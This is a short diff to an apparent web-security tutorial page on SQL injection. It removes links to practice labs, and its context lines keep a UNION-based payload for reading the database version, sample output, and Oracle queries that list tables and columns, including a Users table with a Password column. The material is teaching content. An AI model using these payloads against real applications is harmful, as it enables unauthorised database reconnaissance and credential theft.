@@ -26,8 +26,6 @@ PostgreSQL       <span>SELECT version()</span></pre>
                     <Payloads>' UNION SELECT @@version--</Payloads>
                     <p>This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:</p>
                     <Payloads>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br/>Mar 18 2018 09:11:49<br/>Copyright (c) Microsoft Corporation<br/>Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 {`<X64>`} (Build 14393: ) (Hypervisor)</Payloads>
-                    <Lab>SQL injection attack, querying the database type and version on Oracle</Lab>
-                    <Lab>SQL injection attack, querying the database type and version on MySQL and Microsoft</Lab>
                 </section>
                 <section>
                     <h1>Listing the contents of the database</h1>
@@ -42,7 +40,6 @@ PostgreSQL       <span>SELECT version()</span></pre>
                     <p>This returns output like the following:</p>
                     <Payloads><pre>TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE<br/>=================================================================<br/>MyDatabase     dbo           Users       UserId       int<br/>MyDatabase     dbo           Users       Username     varchar<br/>MyDatabase     dbo           Users       Password     varchar</pre></Payloads>
                     <p>This output shows the columns in the specified table and the data type of each column.</p>
-                    <Lab>SQL injection attack, listing the database contents on non-Oracle databases</Lab>
                 </section>
                 <section>
                     <h1>Listing the contents of an Oracle database</h1>
@@ -51,7 +48,6 @@ PostgreSQL       <span>SELECT version()</span></pre>
                         <li>You can list tables by querying <span>all_tables</span>:<br/><Payloads>SELECT * FROM all_tables</Payloads></li>
                         <li>You can list columns by querying <span>all_tab_columns</span>:<br/><Payloads>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'</Payloads></li>
                     </ul>
-                    <Lab>SQL injection attack, listing the database contents on Oracle</Lab>
                 </section>
             </section>
         </div>
